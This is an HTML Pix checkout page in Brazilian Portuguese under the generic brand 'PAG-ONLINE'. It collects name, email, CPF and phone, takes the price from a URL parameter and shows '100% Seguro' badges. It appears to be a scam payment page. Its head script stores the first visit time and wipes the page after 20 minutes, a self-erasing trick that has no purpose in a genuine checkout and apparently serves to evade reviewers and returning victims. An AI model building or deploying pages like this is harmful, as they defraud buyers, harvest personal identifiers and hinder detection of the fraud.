<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script>
(function() {
    const VINTE_MINUTOS = 20 * 60 * 1000; 
    const agora = new Date().getTime();
    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');
    if (!primeiroAcesso) {
        localStorage.setItem('site_primeiro_acesso', agora);
    } else {
        const tempoDecorrido = agora - parseInt(primeiroAcesso);
        if (tempoDecorrido > VINTE_MINUTOS) {
            document.documentElement.innerHTML = "";
            document.documentElement.style.backgroundColor = "#ffffff";
            window.stop(); 
        }
    }
})();
</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opções de Pagamento | Pagamento Seguro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #0055ff;
            --primary-dark: #0033cc;
            --primary-light: #e8f0ff;
            --accent: #00bfff;
            --success: #28a745;
            --warning: #ff6b35;
            --danger: #ff3b30;
            --text-dark: #1a1a1a;
            --text-gray: #555;
            --text-light: #888;
            --bg-light: #f5f7fa;
            --bg-white: #ffffff;
            --border-color: #e0e4e8;
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.12);
            --pix-color: var(--primary);
            --pix-bg: #f0fffe;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: var(--bg-light); color: var(--text-dark); line-height: 1.6; scroll-behavior: smooth; }
        body { min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 0; }
        .container { width: 100%; max-width: 480px; background-color: var(--bg-white); box-shadow: var(--shadow-md); display: flex; flex-direction: column; }
        .header { background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); color: var(--bg-white); padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .header-left { display: flex; align-items: center; gap: 12px; flex: 1; }
        .back-btn { background: rgba(255, 255, 255, 0.2); border: none; color: var(--bg-white); font-size: 1.1rem; cursor: pointer; padding: 8px 10px; border-radius: 6px; }
        .brand-logo { font-size: 1.3rem; font-weight: 800; letter-spacing: -1px; }
        .trust-banner { background: linear-gradient(90deg, rgba(40, 167, 69, 0.1) 0%, rgba(0, 191, 255, 0.1) 100%); border-bottom: 1px solid rgba(40, 167, 69, 0.2); padding: 10px 20px; display: flex; align-items: center; justify-content: space-around; font-size: 0.75rem; color: var(--text-gray); font-weight: 600; }
        .trust-item { display: flex; align-items: center; gap: 6px; }
        .trust-item i { color: var(--success); }
        .payment-options-container { padding: 20px; }
        .payment-option-card { border: 3px solid var(--primary); border-radius: 20px; padding: 24px; background: linear-gradient(135deg, rgba(0, 85, 255, 0.05) 0%, rgba(0, 85, 255, 0.02) 100%); box-shadow: 0 12px 32px rgba(0, 85, 255, 0.18); position: relative; }
        .payment-option-icon { font-size: 1.8rem; color: var(--primary); margin-bottom: 4px; }
        .payment-option-title { font-size: 1.1rem; font-weight: 800; }
        .payment-option-price { font-size: 1.5rem; font-weight: 900; color: var(--primary); }
        .pix-form-container { margin-top: 15px; padding-top: 15px; border-top: 1px solid rgba(0, 85, 255, 0.1); display: flex; flex-direction: column; gap: 12px; }
        .pix-input-group { display: flex; flex-direction: column; gap: 5px; }
        .pix-input-group label { font-size: 0.75rem; font-weight: 700; color: var(--primary); text-transform: uppercase; }
        .pix-input-group input { padding: 12px 14px; border: 1px solid var(--border-color); border-radius: 10px; font-size: 0.95rem; font-weight: 600; }
        .pix-input-group input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 4px var(--primary-light); }
        .payment-action-btn { background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 1.05rem; font-weight: 800; cursor: pointer; margin-top: 10px; }
        .pix-copy-section { display: none; flex-direction: column; gap: 18px; }
        .pix-code-display-wrapper { background: #f1f5f9; border: 1px dashed #cbd5e1; border-radius: 14px; padding: 14px; }
        .pix-code-input-container { display: flex; align-items: center; gap: 10px; background: white; padding: 10px 12px; border-radius: 10px; border: 1px solid #e2e8f0; }
        .pix-code-display-text { flex: 1; font-family: monospace; font-size: 0.8rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .btn-copy-pix { background: #0f172a; color: white; border: none; padding: 16px; border-radius: 14px; font-weight: 800; cursor: pointer; }
        .spinner { width: 24px; height: 24px; border: 3px solid rgba(255, 255, 255, 0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .pix-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(12px); z-index: 2000; display: none; align-items: center; justify-content: center; padding: 16px; }
        .pix-modal-overlay.active { display: flex; }
        .pix-modal-content { background: white; width: 100%; max-width: 380px; border-radius: 20px; padding: 24px; text-align: center; }
        .pix-error-msg { display: none; background: #fff1f0; border: 1px solid #ffa39e; padding: 10px; border-radius: 10px; color: var(--danger); font-size: 0.85rem; font-weight: 600; }
        .pix-error-msg.visible { display: flex; }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="header-left">
                <button class="back-btn" onclick="history.back();"><i class="fas fa-arrow-left"></i></button>
                <div class="brand-logo">PAG-ONLINE</div>
            </div>
        </header>
        <div class="trust-banner">
            <div class="trust-item"><i class="fas fa-lock"></i> 100% Seguro</div>
            <div class="trust-item"><i class="fas fa-check-circle"></i> Garantido</div>
        </div>
        <main class="payment-options-container">
            <div class="payment-option-card">
                <div id="pix-original-content">
                    <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
                    <div class="payment-option-title">Pagar Agora - Pix</div>
                    <div class="payment-option-price">R$ <span id="pix-amount-display">0,00</span></div>
                    <div class="pix-form-container">
                        <div class="pix-input-group">
                            <label>Nome Completo</label>
                            <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
                        </div>
                        <div class="pix-input-group">
                            <label>E-mail</label>
                            <input type="email" id="pix-email" placeholder="seu@email.com" required>
                        </div>
                        <div class="pix-input-group">
                            <label>CPF</label>
                            <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" required>
                        </div>
                        <div class="pix-input-group">
                            <label>Telefone</label>
                            <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
                        </div>
                        <div class="pix-error-msg" id="pix-error-msg">
                            <span id="pix-error-text">Erro ao gerar PIX.</span>
                        </div>
                        <button class="payment-action-btn" id="btn-generate-pix">
                            Pagar R$ <span id="btn-amount-display">0,00</span>
                        </button>
                    </div>
                </div>
                <div id="pix-copy-content" class="pix-copy-section">
                    <div class="pix-code-display-wrapper">
                        <div class="pix-code-input-container">
                            <span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span>
                        </div>
                    </div>
                    <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código Pix</button>
                    <p style="text-align:center; font-size:0.8rem; margin-top:10px; color:var(--text-gray);">Aguardando pagamento...</p>
                </div>
            </div>
        </main>
    </div>

    <div id="pixCopiedModal" class="pix-modal-overlay">
        <div class="pix-modal-content">
            <i class="fas fa-check-circle" style="font-size:2rem; color:var(--success);"></i>
            <h2 style="margin:10px 0;">Código Copiado!</h2>
            <p>Cole o código no app do seu banco para pagar.</p>
            <button class="btn-copy-pix" style="width:100%; margin-top:20px;" onclick="document.getElementById('pixCopiedModal').classList.remove('active')">Entendi</button>
        </div>
    </div>

    <script>
        const subtotal = new URLSearchParams(window.location.search).get('subtotal') || '89.47';
        const formatted = parseFloat(subtotal).toFixed(2).replace('.', ',');
        document.getElementById('pix-amount-display').textContent = formatted;
        document.getElementById('btn-amount-display').textContent = formatted;

        function maskCPF(v) { return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})/,'$1-$2').replace(/(-\d{2})\d+?$/,'$1'); }
        function maskPhone(v) { return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/g,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').replace(/(-\d{4})\d+?$/,'$1'); }
        document.getElementById('pix-cpf').addEventListener('input', e => e.target.value = maskCPF(e.target.value));
        document.getElementById('pix-phone').addEventListener('input', e => e.target.value = maskPhone(e.target.value));

        document.getElementById('btn-generate-pix').addEventListener('click', async () => {
            const name = document.getElementById('pix-name').value;
            const email = document.getElementById('pix-email').value;
            const cpf = document.getElementById('pix-cpf').value.replace(/\D/g,'');
            const phone = document.getElementById('pix-phone').value.replace(/\D/g,'');
            const errorEl = document.getElementById('pix-error-msg');

            if (!name || !email || cpf.length !== 11 || phone.length < 10) {
                alert('Preencha todos os dados corretamente.'); return;
            }

            const btn = document.getElementById('btn-generate-pix');
            btn.innerHTML = '<div class="spinner"></div>';
            btn.disabled = true;

            try {
                const res = await fetch('/api/pix', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ payer_name: name, payer_email: email, payer_document: cpf, payer_phone: phone, amount: subtotal })
                });
                const data = await res.json();
                if (data.success) {
                    document.getElementById('pix-original-content').style.display = 'none';
                    document.getElementById('pix-copy-content').style.display = 'flex';
                    document.getElementById('pix-code-text').textContent = data.pixCode;
                } else {
                    document.getElementById('pix-error-text').textContent = data.error;
                    errorEl.classList.add('visible');
                    btn.innerHTML = `Pagar R$ ${formatted}`;
                    btn.disabled = false;
                }
            } catch (e) {
                alert('Erro de conexão.');
                btn.innerHTML = `Pagar R$ ${formatted}`;
                btn.disabled = false;
            }
        });

        document.getElementById('btn-copy-pix-action').addEventListener('click', () => {
            navigator.clipboard.writeText(document.getElementById('pix-code-text').textContent);
            document.getElementById('pixCopiedModal').classList.add('active');
        });
    </script>
</body>
</html>
